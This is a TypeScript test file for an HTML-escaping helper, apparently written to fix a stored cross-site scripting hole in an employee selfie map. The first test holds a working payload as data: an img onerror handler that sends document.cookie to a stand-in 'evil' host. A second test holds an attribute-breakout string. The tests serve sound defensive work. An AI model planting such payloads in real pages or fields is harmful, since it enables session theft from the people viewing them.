import { describe, expect, it } from 'vitest';
import { escapeHtml } from './escapeHtml';

describe('escapeHtml', () => {
  it('neutralises the payload that made the selfie map vulnerable', () => {
    // An employee could set their display name to this. The selfie map hands
    // popup content to Leaflet as an HTML string, so it executed in the browser
    // of any admin who opened the map.
    const name = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';

    const escaped = escapeHtml(name);

    // What matters is that no tag can be formed. The literal text "onerror="
    // surviving is harmless once the angle brackets are encoded, because the
    // parser never sees an element for it to be an attribute of.
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
    expect(escaped).toContain('&lt;img');

    // Prove it by parsing: the payload must come back as text, with no element.
    const host = document.createElement('div');
    host.innerHTML = `<p>${escaped}</p>`;
    expect(host.querySelector('img')).toBeNull();
    expect(host.textContent).toContain('onerror=');
  });

  it('encodes quotes so a value cannot break out of an attribute', () => {
    // image_url is interpolated into src="…" — without quote encoding a crafted
    // URL closes the attribute and opens a new one.
    const url = '/x.jpg" onload="alert(1)';

    expect(escapeHtml(url)).toBe('/x.jpg&quot; onload=&quot;alert(1)');
  });

  it('escapes the ampersand first so entities are not double-decoded', () => {
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
  });

  it('leaves ordinary text untouched', () => {
    expect(escapeHtml('Priya Nair')).toBe('Priya Nair');
    expect(escapeHtml('2026-08-10')).toBe('2026-08-10');
  });

  it('renders null and undefined as an empty string, not the words', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('stringifies non-string values', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(0)).toBe('0');
  });
});
